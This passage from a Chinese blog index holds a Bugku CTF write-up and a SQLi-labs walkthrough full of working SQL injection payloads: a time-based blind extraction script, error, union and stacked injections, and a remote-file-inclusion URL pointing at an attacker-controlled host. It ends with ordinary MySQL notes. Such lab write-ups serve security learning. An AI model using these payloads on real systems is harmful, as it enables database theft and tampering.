'a'='a')\n```\n\n再介绍一个**绕过逗号**的姿势：\n\n```\nselect id,ip from client_ip where 1>2  union select * from  ( (select user())a JOIN  (select version())b );  --这个用于union 查询的注入\n```\n\n接下来就是写脚本了\n\n```python\nimport requests\nimport string\n\nurl = \"http://120.24.86.145:8002/web15/\"\ndata = \"12'+(select case when binary substr((select flag from flag) from {} for 1)='{}' then sleep(5) else 1 end) and 'a'='a\" \nflag = ''\nstart = 1\nfor i in range(1,35):\n\tfor item in string.ascii_letters + string.digits:\n\t\ttry:\n\t\t\theaders = {\"x-forwarded-for\":data.format(str(start),item)}\n\t\t\tres = requests.get(url,headers=headers,timeout=3)\n\t\texcept requests.exceptions.ReadTimeout:\n\t\t\tflag += item\n\t\t\tstart += 1\n\t\t\tprint(flag)\n\t\t\tbreak\n```\n\n********************\n\n## 这是一个神奇的登录框\n\n尝试输入 <code>\"</code>，发现有报错，可以报错注入。而且题目什么都没有过滤。\n\ned6b28e684817d9efcaf802979e57ae\ned6b28e684817d9efcaf802979e57aea\n```\nadmin_name=admin&admin_passwd=afd\" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23\n```\n\n```\nadmin_name=admin&admin_passwd=afd\" and updatexml(1,concat(0x7e,(select flag1 from flag1),0x7e),1)%23\n```\n\n用这种方法的出来的flag不对，因为该错误返回的值长度不足，可以再用下列子句截出\n```\nadmin_name=admin&admin_passwd=afd\" and updatexml(1,concat(0x7e,substr((select flag1 from flag1),3,30),0x7e),1)%23\n```\n\n也可以联合注入\n```\nadmin_name=admin&admin_passwd=af\" union select flag1,2 from flag1%23\n```\n\n## 多次\n\n这个题学到了新东西，题目很不错。这个题目过滤了许多关键字\n刚开始输入 <code>?id=1'</code>页面返回错误(但不是报错信息)，添加 <code>?id=1'%23</code>则没有报错，继续尝试 <code>?id=1' and 1=1%23</code>则又开始报错了，猜测可能是存在过滤，但不知道过滤的是什么。找到一个**<font face=\"futura\">异或注入</font>**的方法\n\n********************\n\n在**<font face=\"futura\">id</font>**后面输入 <code>1'^(0)^'</code>，此时页面正常返回，如果换一下 <code>'^(1)^'</code>，此时则会返回错误，那么接下来我们就可以试一下页面究竟过滤了那些关键字。比如 <code>1'^(length('select')!=6)^'</code>如果被过滤则返回错误，没有被过滤就返回正确。\n如此可以测得多个变量被过滤\n\n> <font face=\"futura\">select,union,or,and</font>\n\n但是**<font face=\"futura\">from,where，order</font>**等变量没有被过滤。在尝试一下 <code>1'^(length('selselectect')!=6)^'</code>页面返回正确，说明可以通过这种方法绕过。那接下里就开始常规操作。\n\n********************\n\n```\n?id=1' oorrder by 3%23   # 爆字段数\n?id=-1' ununionion seleselectct 1,database() %23\n```\n\n注意*information*的绕过。\n```\n?id=-1' ununionion seleselectct 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()%23\n```\n\n最后得到下一个页面的地址\n```\n?id=-1' ununionion seleselectct 1,group_concat(address) from flag1%23\n```\n\n到了新页面之后，发现有报错，也会显示你的SQL语句，很简单就能看出很多都被过滤了，不过直接用报错就行了\n```\n?id=1' and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23\n```\n\n看别人的payload使用了**<font face=\"futura\">locate()</font>**函数\n\n# 代码审计\n\n## strcmp比较字符串\n\n提交数组即可绕过 <code>?a[]=1</code>\n\n## 数组返回NULL绕过\n\n也是提交数组 <code>?password[]=123</code> ,因为题目中的函数都是只能处理字符串，如果传入的是数组则会报错返回 <code>NULL</code>达到绕过的效果。\n\n## 变量覆盖\n\n看代码可知，$c获取的是输入流里面的值，因为$b是字符串，所以获取的是控制，故只需要相应的输入空值即可。\n\n## 简单的waf\n\n没做出来，记录一下思路\n\n题目代码如下\n\n```php\n$a=isset($_GET[\"a\"])?$_GET[\"a\"]:'';\n$b=isset($_GET[\"b\"])?$_GET[\"b\"]:'';\n$c=isset($_GET[\"c\"])?$_GET[\"c\"]:'';\n$d=isset($_GET[\"d\"])?$_GET[\"d\"]:'';\n$e=isset($_GET['e'])?$_GET['e']:'';\nif(preg_match('/php/i', $a)){\n    die(\"This not allow pseudo protocol!\");\n}\nif(preg_match('/\\.\\./', $a)){\n    die(\"This also not allow!\");\n}\nif((file_get_contents($a,'r')===$b)&&(file_get_contents($e,'r')===\"I'm Administrator!\")){\n    echo \"hello admin!<br>\";\n    if(preg_match(\"/flag/\",$c)){\n        echo \"不能现在就给你flag哦\";\n        exit();\n    }else{  \n        include($c);\n        if(preg_match('/base64/', $d)){\n            die(\"No! you can't use it!\");\n        }\n        $d = unserialize($d);\n        echo $d;\n    }  \n}else{\n    echo \"you are not admin ! <br>\";\n} \n```\n\n首先变量a中不能出现php://等字段，显示我们不能使用PHP伪协议，但是这里可以远程文件包含，我们可以在自己的vps上写一个文件，然后a参数远程包含，再让b参数等于我们的文本内容就可了，对于e参数我们同样可以利用远程文件包含，在自己的vps上新建一个txt文件写入 `I'm Administrator!` 即可，payload如下\n\n```\nhttp://120.24.86.145:9010?a=http://vps_ip/index.html&b=<a>Hello World</a>%0a&e=http://vps_ip/a.txt\n```\n\n说一下坑点，在使用vim编辑文件的时候，他会默认在文件末尾添加一个换行符，这也是为什么b参数后面要添加一个 `%0a(换行符)` ，但是在e参数对应的代码中的 `I'm Administrator!` 可是没有换行符的，怎么办呢？百度找到了一个方法：\n\n> 1、进入vim前，增加-b参数\n```\nvim -b a.txt\n```\n> 2、进入命令行模式，开启 set noeol\n> 这样就不会在文件末尾添加换行符了。\n\nc参数和d参数个人感觉思路是c参数包含一个PHP文件，然后d参数反序列化读取，题目还有一个flag.php文件，所以c参数应该就是要包含该文件，题目过滤了flag，可以用大写绕过 `Flag.php` ，但是这里应该有一个类来反序列化才对，我感觉应该是通过文件泄露来获取，但是尝试了好多次都不行，直接访问flag，会下载到一个文件，信息为\n\n> please call admin to get flag\n\n不知道这是什么意思，题目到这儿就卡住了，所以payload只有\n\n```\nhttp://120.24.86.145:9010/?a=http://vps_ip/index.html&b=<a>Hello%20World</a>%0a&e=http://vps_ip/a.txt&c=Flag.php\n```\n\n# 加密\n\n## 滴答 \\~ 滴\n\n摩斯解密可得<code>bkctfmisc</code>，提交即可,注意全部大写。\n\n## 聪明的小羊\n\n栅栏解密\n\n## ok\n\n这段密文是一种ook语言，直接在线跑一下即可\n\n## 这不是摩斯密码\n\nbrainfuck代码，在上一题那个网站跑一下即可。\n\n## 散乱的密文\n\n> lf5{ag024c483549d7fd@@1}\n一张纸条上凌乱的写着2 1 6 5 3 4\n\n刚开始看到{前面有三位以为明文应该是key，顺着这个思路往下想，结果不对，后面注意到密文的2，1两位翻转一下是fl，6，5两位加上就是flag，于是再把3,4位放到原来5,6位的位置，那么前六位就是 <code>flag{5</code> ，我们可以看到前六位进行的调整分别是1，2位交换位置，5,6位交换到3,4位顺序不变，3,4位调整到5,6位但是位置交换一下，于是把每六位分成一组，每组按照前述的方法做变换，最终可以得到flag\n\n```\nflag{52048c453d794df1}@@\n```\n\n## 贝斯家族\n\nbase91解码\n\n# 社工\n\n## 密码\n\n根据生日姓名等猜测<code>zs19970315</code>\n\n## 王晓明的日记\n\n利用bugku在线密码生成工具生成密码字典测试一下即可\n\n# 分析\n\n## flag被盗\n\n过滤条件 `http contains \"flag\"`，在第二条数据中即发现了flag\n\n## 抓到一只苍蝇\n\n首先查看一下http请求，在第一个就发现\n\n![](bugkuwriteup/1.png)\n\n本能的感觉这题和这个fly.rar应该有点关系，所以过滤一下 'http contains \"fly.rar\"'\n\n![](bugkuwriteup/2.png)\n\n看到了题目的提示内容，感觉走对了，这个包应该是QQ邮箱的包，所以肯定是走post请求的，过滤一下获取rar文件包 `http.request.method == POST`\n\n可以看到从第二个到第六个正式rar的文件内容，但是这五个文件的总长度却比fly.rar要大，应该有多余的头部，计算一下头部长度\n\n> (527521bytes – 525701bytes) / 5 =  364 bytes\n\n把每个一次导出，然后用hxd去掉头部364字节，之后再合并一下\n\n![](bugkuwriteup/3.png)\n\n可以看到md5值是正确的，证明我们得到了正确的fly.rar文件，但是解压时却要求输入密码，猜测是伪加密，将文件头0x1674后面的84改为80。（84为加密，80/20不加密），解密之后有个TXT文件，binwalk，foremost一下，在图片中找到一个二维码，扫码即可得到flag。\n\n## 信息提取\n\n给的数据包是sqlmap注入的一个数据包，题目的意思是让我们从sqlmap的payload中恢复出数据，数据包的最后部分就是数据的记录，吧这部分分出来保存为a.pcap，将关键信息存入txt文件中\n\n```python\n# import scapy\n# from scapy.all import *\n# from scapy.utils import PcapReader\n\n# pcaps = rdpcap(\"a.pcap\")\n# file = open('1.txt','wb')\n# for i in range(476):\n# \tfile.write(pcaps[i]['Raw'].load)\n\n# 将流量包字段信息导出，之后在用sublime过滤只留下请求内容和response长度，示例如下\n\n# GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C34%2C1%29%29%3E1 HTTP/1.1\n# Content-Length: 166\n\nfrom urllib.parse import unquote\nimport re\n\ndef is_rigth(x):\n\tif int(x) > 4:\n\t\treturn True\n\telse:\n\t\treturn False \n\nwith open('1.txt','r') as file:\n\tans = \"\"\n\treq = file.readlines()\n\tlength = req[238:476]\n\treq = req[0:238]\n\tfor i in range(len(req)//7 - 1):\n\t\tnum = int(re.search('>([0-9]{2,})',unquote(req[i*7+6],'utf-8')).group(1))\n\t\tif is_rigth(length[i*7+6][-3]):\n\t\t\tans += chr(int(num+1))\n\t\telse:\n\t\t\tans += chr(int(num))\n\tprint(ans)\n# ISG{BLind_SQl_InJEcTi0N_DeTEcTEd}\n```","tags":["CTF"],"categories":["writeup"]},{"title":"SQLI-LABS(Less36-Less65)","url":"/2018/03/05/sqli-labs3/","content":"\n接上篇\n\n<!--more-->\n\n# LESS-36\n\n函数`mysql\\_real\\_escape\\_string()`转义SQL语句中使用的字符串中的特殊字符。\n下列字符受影响：\n\n{% blockquote %}\n\\x00\n\\n\n\\r\n\\\n'\n\"\n\\x1a\n{% endblockquote %}\n\n如果成功，则该函数返回被转义的字符串。如果失败，则返回false。\n\n可以使用宽字节注入\n\n```\n?id=-1%df' union select 1,database(),3--+\n```\n\n在使用`mysql_real_escape_string()`函数时，想要避免这种问题，需要将mysql设置为`gbk`即可\n\n# LESS-37\n\n和34关绕过一样，waf和36关差不多\n\n```sql\nuname=admin♦' or 1=1 limit 3,1#&passwd=admin&submit=Submit\n```\n\n***********************\n\n# `堆叠注入stacked injection`\n\n所谓堆叠注入，就是指多条SQL语句同时执行，在命令行中每个SQL语句都是以`;`结尾。虽然说union语句也可以执行两条select语句，区别在于union语句可以执行的语句有限，而堆叠注入可以执行任何语句。比如\n```\nselect * from pruducts where id=1;delete from products\n```\n\n堆叠注入的局限性在于并非每个环境都可以执行，受到环境的限制，\n\n***********************\n\n\n# LESS-38\n\n本题明注盲注皆可以，明注payload\n```\n?id=-1' union select 1,group_concat(username),3 from users--+\n```\n\n**堆叠注入**\n```\n?id=-1';create table test like users--+\n```\n可以看到数据库里面成功创建，然后再删除一下\n```\n?id=-1';drop table test--+\n```\n\n# LESS-39\n\npayload\n```\n?id=-1 union select 1,2,3--+\n```\n\n也可堆叠注入\n\n# LESS-40\n\n盲注payload\n```\n?id=2') and ascii(substr(database(),1,1))=115--+\n```\n本题错误不回显，不能报错注入\n\n# LESS-41\n\n和40关一样无法报错，可以和39关一样\n```\n?id=-1;create table test like users--+\n```\n多条命令执行。也可以注入\n```\n?id=-1 union select 1,2,database()--+\n```\n\n# LESS-42\n\n本关mysqli_real_escape_string只过滤了username字段，对于password则没有过滤，payload\n```\nlogin_user=admin&login_password=c';create table test like users#\n```\n\n# LESS-43\n\n和42关一样，只是闭合方式不同\n```\nlogin_user=admin&login_password=c') or 1=1#\n```\n\n# LESS-44\n\n和42关一样，只是没有报错无法盲注\n```\nlogin_user=admin&login_password=c' or 1=1#\n```\n\n# LESS-45\n\n```\nlogin_user=admin&login_password=c') or 1=1#\n```\n\n注意：这几关页面都在login.php页面，不在原页面。\n\n# LESS-46\n\n本关是`order by`注入，\n尝试一下分号发现有报错，报错注入可以用一下\n```\n?sort=2 and extractvalue(1,concat(0x3c,(select database())))\n```\n看不到数据库名的话查看一下元素即可\n\n对于这种问题有三种方法\n> 1、直接添加注入语句 `?sort=(select \\*\\*\\*\\*\\*\\*)`\n> 2、利用一些函数，例如rand函数，<code>?sort=rand(sql语句)</code>，而且此处rand(true)和rand(false)是不相同的。\n> 3、利用and，例如<code>?sort=1 and (加sql语句)</code>\n\n还可以执行infile等命令上传一句话木马\n\n# LESS-47\n\n本关只是闭合方式发生了变化，只能进行报错和延时注入\n\n```\n?sort=1' and extractvalue(1,concat(0x3c,(select database())))%23\n?sort=1 and if(1=1, sleep(1), null)\n?sort=1' and (length(database())) = 8 and if(1=1, sleep(1), null)%23\n?sort=1' and (ascii(substr((select database()) ,1,1))) = 115 and if(1=1, sleep(1), null)%23\n```\n\n# LESS-48\n\n这关没有报错回显，延时盲注即可\n```\n?sort=1 and (length(database())) = 8 and if(1=1, sleep(1), null)%23\n```\n\n# LESS-49\n\n跟上关差不多只是闭合方式不同\n```\n?sort=1' and (length(database())) = 8 and if(1=1, sleep(1), null)%23\n```\n\n# LESS-50\n\n考察order by的堆叠注入\n```\n?sort=1;create table test like users;\n```\n\n# LESS-51\n\n闭合方式不同\n```\n?sort=1';create table test like users--+\n```\n\n\n# LESS-52\n\n本题不报错，无法报错注入，依然可以堆叠注入\n```\n?sort=1;create table test like users\n```\n\n# LESS-53\n\n本关错误不能回显，但是可以和51关一样堆叠注入\n```\n?sort=1';create table test like users--+\n```\n\n# LESS-54\n\n从本关开始进行更加进阶的注入，所用数据库也改为`challenges`，每个答案只能尝试10次，10次之后则会重置表名选项等信息。\n\n由于已经知道数据库名，所以可以直接开始爆表名\n```\n?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ \n```\n\n得到表名 <code>utj0xhedjp</code>(你的和我的不一样，是随机的)，接下来爆列名\n```\n?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='utj0xhedjp'--+ \n```\n\n得到<code>id,sessid,secret_W2TD,tryy</code>，得到字段\n```\n?id=-1' union select 1,secret_W2TD,3 from utj0xhedjp--+ \n```\n得到<code>vYPh8AlkQMTlEGkZXRKWo1PT</code>，提交即可。\n\n# LESS-55\n\n本关限制次数为14次，主要是前面尝试闭合，这个找出来后面就简单了\n```\n?id=1)%23\n```\n\n爆表名\n```\n?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23\n```\n\n> jq0p5t7r1m\n\n爆列名\n```\n?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name='jq0p5t7r1m'%23\n```\n\n> id,sessid,secret_3JXI,tryy\n\n继续\n```\n?id=-1) union select 1,secret_3JXI,3 from jq0p5t7r1m%23\n```\n\n# LESS-56\n\npayload\n```\n?id=1')%23\n```\n\n剩下的就不做了。\n\n**注意：**本题中，如果用<code>?id=1\"%23</code>也可以闭合，只是无法继续后面的步骤，提交上述参数后执行的SQL语句为\n```\nSELECT * FROM security.users WHERE id=('1\"#') LIMIT 0,1\n```\n在数据库中执行确实能够查到数据，那么问题在哪呢？\n> 查找资料后发现，mysql在运算过程中能够自动的把数字转化为字符串，而在比较运算中，如果是数字和字符串比较，则可以自动的把字符串转为数字，转换的时候如果首字符字符是数字，则会转换为相应的数字，例如`'1\"#'`转化为数字值为1，如果是`'11fads'`则为11，不过必须是数字和字符串比较的时候才会转换，如果都是字符的话则不会这样。 \n\n# LESS-57\n\n本题是双引号闭合\n```\n?id=1\"%23\n```\n\n# LESS-58\n\n本题无法进行联合注入，但是可以报错，故报错注入\n```\n?id=1' and extractvalue(1,concat(0x5c,(select )))%23\n```\n爆内容\n```\n?id=1' and extractvalue(1,concat(0x5c,(select secret_AJHH from y9hrni0ywl)))%23\n```\n\n# LESS-59\n\n本题可以直接报错注入\n```\n?id=1 and extractvalue(1,concat(0x5c,(select database())))%23\n```\n\n# LESS-60\n\n改变闭合方式\n```\n?id=1\") and extractvalue(1,concat(0x5c,(select database())))%23\n```\n\n# LESS-61\n\n双引号闭合，有点奇葩\n```\n?id=1')) and extractvalue(1,concat(0x5c,(select database())))--+\n```\n\n# LESS-62\n\n本题没有错误回显，无法union注入，而且注释符貌似也被过滤了，可以考虑盲注\n```\n?id=1' and length(database())=10 and 'a'='a\n```\n爆表名\n```\n?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))=54 and 'a'='a\n```\n爆列名\n```\n?id=1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='64r31rkgr6'),2,1))=100 and 'a'='a\n```\n爆数据\n```\n?id=1' and ascii(substr((select secret_R69X from 64r31rkgr6 ),1,1))=121 and 'a'='a\n```\n\n但是查看源代码发现这并非本关的闭合方式，闭合的话应该是\n```\n?id=1') and length(database())=10%23\n```\n但是我的payload也是可以的，原因在于)将我的输入闭合了，这也说明了为什么在我的原payload中不能使用注释符的原因。\n\n# LESS-63\n\n单引号闭合\n```\n?id=1'%23\n```\n\n# LESS-64\n\n双括号闭合\n```\n?id=1))%23\n```\n\n# LESS-65\n\npayload\n```\n?id=1\")%23\n```\n\n# 后记\n\n总算是把所有的关都做完了，本次感慨良多啊。刚开始的时候还特别有激情，后面就不想做了，直到有一天，我制定了一个计划，一天5关，终于坚持下来了，看来做什么事情都要有个计划呀。做完后还是学到了很多的东西的，剩下的话还要练习一下写盲注脚本。\n","tags":["SQL注入"],"categories":["writeup"]},{"title":"MySQL学习笔记(七)","url":"/2018/02/18/mysql7/","content":"\n本节介绍MySQL数据库的备份和恢复。\n\n<!--more-->\n# **常用的备份恢复方法**\n\n本节介绍多种备份方法\n\n## **使用SQL语句：导入导出数据**\n\n### **1、导出表数据**\n\nSELECT INTO...OUTFILE格式：\n```sql\nSELECT * INTO OUTFILE '文件名1'\n[FIELDS\n\t[TERMINATED(终止) BY 'string']\n\t[[OPTIONALLY] ENCLOSED by 'char']\n\t[ESCAPED BY 'char']\n]\n[LINES TERMINATED BY 'string']\n|DUMPFILE '文件名2'\n```\n\n**说明：**\n> (1)这个语句将select语句选中的行写入到一个文件中，如果要指定特定位置，则要在文件名前加上具体的路径，空值会以'\\N'表示\n> (2)FIELDS子句：如果指定了FIELDS子句，那么后面的三个至少要指定一个。\n1、TERMINATED BY 用来指定字段值之间的的符号，例如，TERMINATED BY <font face=\"Futura\">','</font>，则指定了逗号作为分隔标志，\n2、ENCOLSED BY 子句用来指定包裹文件中字符值的符号，例如ENCLOSED BY <font face=\"Futura\">'\"'</font>，表示文件中字符值放在双引号之间，若加上OPTIONALLY表示所有的值都放在双引号之间。\n3、ESCAPED BY 子句用来指定转义字符，例如，<font face=\"Futura\">“ESCAPED BY '\\*'”</font> 将<font face=\"Futura\">“\\*”</font>指定为转义字符，取代<font face=\"Futura\">“\\”</font>，如空格将表示为<font face=\"Futura\">“\\*N”</font>。\n> (3)LINES子句：在LINES子句中使用TERMINATED BY 指定一行结束的标志，比如“LINES TERMINATED BY '?'”表示一行以“?”作为结束标志。\n> 如果FIELDS和LINES子句都不指定，则默认使用以下子句。\n```sql\nFIELDS TERMINATED BY '\\t' ENCLOSED BY '' ESCAPED BY '\\\\'\nLINES TERMINATED BY '\\n'\n```\n> 如果使用DUMPFILE而不是使用OUTFILE，所导出文件中的所有行都彼此紧挨着放置，值和行之间没有任何标记，，形成了一个长长的值。\n\n**注意：**使用上述语句导出的只是数据的内容，不包括表的结构。\n\n### **2、导入表数据**    \n\n该语句可以将OUTFILE语句导入文件中的数据导入到数据库中。\nLOAD DATA ...INFILE格式：\n\n```sql\nLOAD DATA [LOW_PRIORITY|CONCURRENT] [LOCAL] INFILE '文件名.txt'\n\t[REPLACE|IGNORE]\n\tINTO TABLE 表名\n\t[FIELDS\n\t\t[TERMINATED(终止) BY 'string']\n\t\t[[OPTIONALLY] ENCLOSED by 'char']\n\t\t[ESCAPED BY 'char']\n\t]\n\t[LINES\n\t\t[STARTING BY 'string']\n\t\t[TERMINATED BY 'string']\n\t]\n\t[IGNORE number LINES]\n\t[(列名或用户变量, ...)]\n\t[SET 列名=表达式, ...]\n```\n\n**说明：**\n> LOW_PRIORITY|CONCURRENT：若指定前者，则延迟语句的执行，若指定后者，则当LOAD DATA正在执行的时候，其他线程可以同时使用该表的数据。\n> LOCAL：若指定LOCAL，则文件会被客户主机上的客户端读取，并被发送到服务器，只是执行速度略慢些。\n> 文件名.txt：可以带路径指定文件名。\n> REPLACE|IGNORE：如果指定了REPLACE，则当文件中出现与原有行相同的唯一关键字值时，输入行会替换原有行，如果是IGNORE的话会跳过。\n> STARTING指定每行的前缀，如果行中不包括该前缀，则该行被跳过。 \n> IGNORE number LINES：可以用来忽略文件的前几行，例如，可以使用IGNORE 1 LINES来跳过第一行。\n> 列名或用户变量：当表中列的顺序与文件中字段值顺序不同时，就必须指定一个列清单。\n> SET子句：SET子句可以在导入数据时修改表中列的值。\n\n**<font face=\"隶书\">example:</font>**\n\n```sql\nselect * from student where job='计算机科学与技术'\n\tinto outfile 'D:/myfile.txt'\n\t\tfields terminated by ','\n\t\t\toptionally enclosed by '\"'\n\t\tlines terminated by '?';\n```\n\n执行此语句产生报错：\n> ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement\n\n这是因为MySQL对默认导出的目录有权限限制，使用命令**<font face=\"隶书\">show variables like '%secure_file%'</font>** 可以查看此目录，必须导入到指定目录中才可以。\n\n> secure_file_priv: G:\\PHPwamp\\wamp64\\tmp\\\n\n修改后的语句：\n\n```sql\nselect * from student where job='计算机科学与技术'\n\tinto outfile 'G:/PHPwamp/wamp64/tmp/myfile.txt'\n\t\tfields terminated by ','\n\t\t\toptionally enclosed by '\"'\n\t\tlines terminated by '?';\n```\n\n**注意：**这里的Windows路径名称需要使用正斜杠指定而不是反斜杠。\n\n导入上述数据到新建的xs表中：\n\n```sql\nload data infile 'G:/PHPwamp/wamp64/tmp/myfile.txt'\n\tinto table xs\n\t\tfields terminated by ','\n\t\t\toptionally enclosed by '\"'\n\t\tlines terminated by '?';\n```\n\n","tags":["SQL"],"categories":["资料"]},{"title":"MySQL学习笔记(六)","url":"/2018/02/09/mysql6/","content":"\n# **前言**\n\nMySQL自5.0版本之后，开始支持存储过程、存储函数、触发器和事件。这篇文章就来学习一下这个问题。\n<!--more-->\n\n# **存储过程**\n\n使用存储过程的优点\n\n> (1) 存储过程在服务器端运行，执行速度快\n> (2) 存储过程执行一次后，期执行计划就会存储在告诉缓冲存储器中，在以后的操作中则会直接调用已编译的二进制代码执行，从而提高了系统性能。\n> (3) 确保数据库安全，使用存储过程即可完成所有数据库操作，可以通过编程方式控制上述操作对数据库信息访问的权限。\n> 存储过程实质上相当于函数，所以具有函数的优点。\n\n## **创建存储过程**\n\n创建存储过程命令格式\n\n```sql\ncreate procedure 存储过程名 ( [参数 ...] )\n\t[ 特征 ...] 主体\n```\n\n### 1、存储过程参数\n\n参数:\n```sql\n[ in|out|inout ] 参数名 参数类型    # 输入参数|输出参数|输入/输出参数，相当于input，print等\n```\n\n注意：参数的名字不要采用列的名字，否则会引发重名错误。\n\n### 2、存储过程特征\n\n```sql\n\tlanguage SQL\n| [not] deterministic\n| {contains sql|no sql|reads sql data|modifies sql data}\n| sql security {definer|invoker}\n| comment 'string'\n```\n\n\n**说明：**\n\n> *language SQL：*表名编写这个的语言为SQL语言，指定编程语言，目前仅支持SQL语言。故此选项不可指定\n> *deterministic：*对同样的输入参数输出相同的结果，加 <code>not</code> 参数会产生不确定的结果，默认为 <code>not deterministic</code>\n> *contains sql：*表示存储过程不包含读或写数据的语句， <code>reads sql data</code> 表示存储过程包含读数据的语句，但不包含写的数据。 <code>modifies sql data</code> 表示存储过程包含写数据的语句。默认的是 <code>contains sql</code>。\n> *sql security：*定义使用该存储过程的用户的许可。 <code>definer</code>创建者， <code>invoker</code>调用者。\n> *comment 'string'：*对存储过程的描述， <code>string</code>为描述内容。可以使用命令 <code>show create procedure</code> 来显示。\n\n### 3、存储过程主体\n\n存储过程主体包含了在过程调用的时候必须执行的语句，这个部分总是以*begin*开始，以*end*结束，如果包含多个语句，则以分号作为结束符，当然，如果只有一句语句的话则不必指定*begin-end*语句。\n\n服务器处理语句的时候是以分号作为结束符，如果以分号作为每个语句的结束符，那么执行一条语句就会遇到分号则会认为执行结束，这显然无法执行后面的指令，所以需要用\"delimiter 结束符\"将结束符改为其他符号。\n\n用存储过程实现删除一个特定学生的信息\n\n```sql\ndelimiter $$\ncreate procedure delete_student(in xh char(6))\nbegin\n\tdelete from xs where 学号=xh;\nend $$\ndelimiter ;\n```\n\n## **存储过程体**\n\n在存储过程中可以使用所有的SQL语句类型，也包括变量的定义和赋值。\n\n### 1、局部变量\n\n在存储过程可以声明局部变量，可以用来存储临时结果，如果不赋初值的话则默认为NULL。\n\n```sql\ndeclare 变量名 ...类型 [默认值]\n```\n\n**<font face=\"隶书\">example</font>**\n\n```sql\ndeclare num int(4);\ndeclare str1,str2 varchar(6);\n```\n\n局部变量只可以在begin-end语句块中声明，并且必须在存储过程的开头。声明完后也只能在该b-e块中使用，不能再其它块中使用。当然，也可以创建 *用户变量* ，只要在前面加@符号，用户变量存在于整个回话之中。\n\n\n### 2、使用set语句赋值\n\n格式：\n```sql\nset 变量名=表达式 [,变量名=表达式] ...\n```\n\n**<font face=\"隶书\">example</font>**\n\n```sql\nset num=1, str1='hello';\n```\n\n### 3、select...into语句\n\n使用这个语句可以把选定的列值直接存储到变量中。因此，返回结果只能有一行。\n\n```sql\nselect 列名[,...] into 变量名 [,...] table_expr\n```\n\n<code>table_expr</code>指select语句中的from子句及后面的部分。\n\n**<font face=\"隶书\">example</font>**\n\n例如，在存储过程中，将xs表中的学号为081101的学生姓名和专业名的值分别赋给变量name和project。\n\n```sql\nselect 姓名,专业名 into name,project\n\tfrom xs;\n\twhere 学号='081101';\n```\n\n注意：该语句只能在存储过程中使用，而且变量名name和project需要在使用之前声明。\n\n### 4、流程控制语句\n\n在MySQL语句中，可以使用过程式语句。\n\n#### 1) if语句\n\n格式：\n\n```sql\nif 条件 then 语句\n[elseif 条件 then 语句] ...\n[else 语句]\nend if\n```\n\n**<font face=\"隶书\">example</font>**\n\n对于一个数据库，判断两个输入的参数哪一个更大。\n\n```sql\ndelimiter $$\ncreate procedure xscj.compar\n\t(in kl interger,in k2 interger,out k3 char(6))\nbegin\n\tif k1>k2 then\n\t\tset k3='大于';\n\telseif k1=k2 then\n\t\tset k3='等于';\n\telse\n\t\tset k3='小于';\n\tend if;\nend$$\ndelimiter ;\n```\n\n#### 2) case语句\n\n格式：\n\n```sql\nCASE case_value\n\tWHEN when_value THEN 语句\n\t[WHEN when_value THEN 语句] ...\n\t[ELSE 语句]\nEND CASE\n```\n或者\n```sql\nCASE\n\tWHEN 条件 THEN 语句\n\t[WHEN 条件 THEN 语句] ...\n\t[ELSE 语句]\nEND CASE\n```\n\n**<font face=\"隶书\">example</font>**\n\n```sql\ndelimiter $$\ncreate procedure xscj.result\n\t(in str varchar(4),out sex varchar(4))\nbegin\n\tcase str\n\t\twhen 'm' then set sex='男';\n\t\twhen 'f' then set sex='女';\n\t\telse set sex='无';\n\tend case;\nend $$\ndelimiter ;\n```\n\n或者\n\n```sql\ncase\n\twhen str='m' then set sex='男';\n\twhen str='f' then set sex='女';\n\telse set sex='无';\nend case;\n```\n\n#### 3) 循环语句\n\n##### **<font face=\"宋体\">while</font>语句格式**\n\n```sql\n[begin_label:]\nWHILE 条件 DO\n\t语句\nEND WHILE [end_label]\n```\n\n注意：b-e label必须同时出现，并且label必须相同。\n\n```sql\ndelimiter $$\ncreate procedure dowhile()\nbegin\n\tdeclare v1 int default 5;\n\twhile v1>0 do\n\t\tset v1=v1-1;\n\tend while;\nend$$\ndelimiter ;\n```\n\n##### **<font face=\"宋体\">repeat</font>语句格式**\n\n```\n[begin_label:]\nREPEAT\n\t语句\n\tUNTIL 条件\nEND REPEAT [end_label]\n```\n**<font face=\"隶书\">example</font>**\n```sql\nrepeat\n\tv1=v1-1;\n\tuntil v1<1;\nend repeat;\n```\n\n##### **<font face=\"隶书\">LOOP</font>语句格式**\n\n```\n[begin_label:]\nLOOP\n\t语句\nEND LOOP [end_label]\n```\n\n*loop* 允许某特定语句或语句群的重复执行，想要退出的话可以用一个*leave*语句。\n\n```\nLEAVE label\n```\n\n**<font face=\"隶书\">example</font>**\n\n```sql\ndelimiter $$\ncreate procedure doloop()\nbegin\n\tset @a=10;\n\tlabel:loop\n\t\tset @a=@a-1;\n\t\tif @a<0 then\n\t\t\tleave label;\n\t\tend if;\n\tend loop label;\nend$$\ndelimiter ;\n```\n\n##### **<font face=\"宋体\">iterate</font>语句**\n\n```sql\nITERATE label\n```\n\n这个语句意为\"再次循环\"，指重新开始一个循环，与continue的含义类似。\n\n### 5、处理程序和条件\n\n### 6、游标\n\n一条select...into语句返回的是带有值的一行，如果想要处理返回的多行数据，则可以使用游标。\n\n#### 1)声明游标\n\n语法格式：\n```\nDECLARE 游标名 CURSOR FOR select 语句\n```\n注意：select语句不能有into子句\n\n**<font face=\"隶书\">example</font>**\n\n```sql\ndeclare xs_curl cursor for\n\tselect 学号,姓名,性别,出生日期,总学分\n\t\tfrom xs\n\t\twhere 专业名='计算机';\n```\n注意：该语句不能单独运行，必须在存储过程或存储函数中运行。\n\n#### 2)打开游标\n```sql\nOPEN 游标名\n```\n\n#### 3)读取数据\n\n```sql\nFETCH 游标名 INTO 变量名 